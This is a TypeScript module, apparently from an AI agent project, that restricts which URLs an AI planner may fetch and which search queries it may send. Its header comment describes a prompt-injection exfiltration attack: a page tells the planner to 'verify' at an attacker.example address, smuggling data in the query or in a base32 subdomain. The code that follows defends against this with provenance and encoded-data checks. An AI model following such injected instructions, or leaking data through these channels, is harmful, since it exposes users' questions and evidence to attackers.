// Origin: original ProjectOS code
/**
 * Where a fetched address may come from (PROJECTOS-PORT-RESEARCH1A, fix round).
 *
 * THE EXFILTRATION THIS CLOSES. A fetch is a request to a server somebody else runs. If the planner may fetch any address,
 * a page that says "verify at https://attacker.example/c?d=..." gets the planner to send the question and the evidence out
 * in the address, or in a subdomain (`<base32>.attacker.example`) that only the attacker's DNS ever sees. The credential-name
 * list on query strings cannot stop that, because the data is not in a credential-named field.
 *
 * THE RULE. An address the planner asks for must appear VERBATIM, in its canonical form, among
 *   - the addresses typed in the question, and
 *   - the addresses in this run's screened search results.
 * An address found only inside a fetched page is never fetchable. The one exception is a policy in allow-list mode: then an
 * unlisted address on a host that is NAMED in the policy, exactly (not a subdomain of it), may be fetched, and only with no
 * query string and no fragment. In every case the address is capped in length, and a run may touch only a few distinct hosts.
 *
 * IN ALLOW-LIST MODE the path is bounded too: an unlisted address on a named host may have a path of at most
 * `MAX_ALLOW_LIST_PATH_CHARS`, so what the run knows cannot leave in the path to a host the owner allowed.
 *
 * THE SEARCH QUERY IS AN OUTBOUND STRING TOO. `queryProvenanceProblem` refuses a planner-chosen query that is longer than
 * `MAX_PLANNER_QUERY_CHARS`, carries an address (a scheme, `www.`, a bare `host.tld/...`, or an `@`), carries a run of
 * `MIN_ENCODED_RUN_CHARS` or more base64, hex or base32 characters, or quotes `MAX_QUERY_QUOTE_CHARS` or more characters of a page
 * this run fetched. The reason is exact in the audit record and one neutral reason to the planner.
 *
 * Every refusal is a closed reason. What cannot be fetched is refused here, before the guard is asked, so nothing about the
 * network is learned from it.
 *
 * WHAT THIS CANNOT PROVE. That a search provider's results are honest: an address a provider lists is fetchable. Results
 * are screened for hidden text and instructions (`resultScreen.ts`), and the host cap bounds what one run can reach.
 */

import type { UrlRefusalReason } from './refusal.js';
import { PAGE_PORTS } from './ssrfGuard.js';
import { parseWebUrl } from './urlParse.js';
import type { WebsitePolicy } from './websitePolicy.js';

export const MAX_FETCH_URL_CHARS = 1024;
export const MAX_HOSTS_PER_RUN = 4;
/** In allow-list mode an unlisted address may have a path this long and no more: data does not leave in a long path. */
export const MAX_ALLOW_LIST_PATH_CHARS = 64;
/** The most a planner-chosen search query may be. */
export const MAX_PLANNER_QUERY_CHARS = 200;
/** A verbatim slice of a fetched page this long, in a query, is a page being sent out. */
export const MAX_QUERY_QUOTE_CHARS = 40;
/** A run of base64, hex or base32 characters this long is data, not a question. */
export const MIN_ENCODED_RUN_CHARS = 32;
const MAX_LISTED_URLS = 200;

const URL_IN_TEXT = /https?:\/\/[^\s<>"'`)\]}]{1,2048}/gi;

/** The canonical form of an address, or null when it does not parse as a page address. */
export function canonicalOf(url: string): string | null {
  const parsed = parseWebUrl(url, PAGE_PORTS);
  return parsed.ok ? parsed.url.canonical : null;
}

/** The path of a canonical address: everything after the host and the port. */
const pathOf = (canonical: string): string => canonical.replace(/^https?:\/\/[^/]*/, '');

/** The canonical addresses written in a piece of text, up to a bound. */
export function listedUrlsOf(text: string): readonly string[] {
  const found: string[] = [];
  for (const match of text.matchAll(URL_IN_TEXT)) {
    const canonical = canonicalOf(match[0].replace(/[.,;:!?]+$/, ''));
    if (canonical !== null) found.push(canonical);
    if (found.length >= MAX_LISTED_URLS) break;
  }
  return found;
}

/** Why the planner may not fetch this address, or null. `hosts` are the hosts this run has already fetched from. */
export function urlProvenanceProblem(url: unknown, listed: ReadonlySet<string>, policy: WebsitePolicy, hosts: ReadonlySet<string>): UrlRefusalReason | null {
  if (typeof url !== 'string' || url === '') return 'invalid-url';
  if (url.length > MAX_FETCH_URL_CHARS) return 'url-too-long';
  const parsed = parseWebUrl(url, PAGE_PORTS);
  if (!parsed.ok) return parsed.reason;
  const { canonical, host } = parsed.url;
  if (!listed.has(canonical)) {
    const named = policy.enabled === true && policy.mode === 'allow' && policy.rules.some((rule) => rule.pattern === host);
    if (!named || url.includes('?') || url.includes('#') || pathOf(canonical).length > MAX_ALLOW_LIST_PATH_CHARS) return 'not-listed';
  }
  return hosts.has(host) || hosts.size < MAX_HOSTS_PER_RUN ? null : 'too-many-hosts';
}

const ADDRESS_IN_QUERY = /(?:[A-Za-z][A-Za-z0-9+.-]{1,30}:\/\/|\bwww\.|@|(?:[A-Za-z0-9-]{1,63}\.){1,8}[A-Za-z]{2,24}[/?#])/;
const ENCODED_RUN = new RegExp(`[A-Za-z0-9+/=_-]{${MIN_ENCODED_RUN_CHARS},}`);
const squash = (text: string): string => text.toLowerCase().replace(/\s+/g, ' ').trim();

/** Why this planner-chosen search query may not be sent, or null. `pageTexts` are the pages this run fetched. */
export function queryProvenanceProblem(query: unknown, pageTexts: readonly string[]): UrlRefusalReason | null {
  if (typeof query !== 'string') return null;
  if (query.length > MAX_PLANNER_QUERY_CHARS) return 'query-too-long';
  if (ADDRESS_IN_QUERY.test(query)) return 'query-has-address';
  if (ENCODED_RUN.test(query)) return 'query-has-encoded-data';
  const asked = squash(query);
  if (asked.length < MAX_QUERY_QUOTE_CHARS) return null;
  const pages = pageTexts.map(squash);
  for (let at = 0; at + MAX_QUERY_QUOTE_CHARS <= asked.length; at += 1) {
    const slice = asked.slice(at, at + MAX_QUERY_QUOTE_CHARS);
    if (pages.some((page) => page.includes(slice))) return 'query-quotes-a-page';
  }
  return null;
}
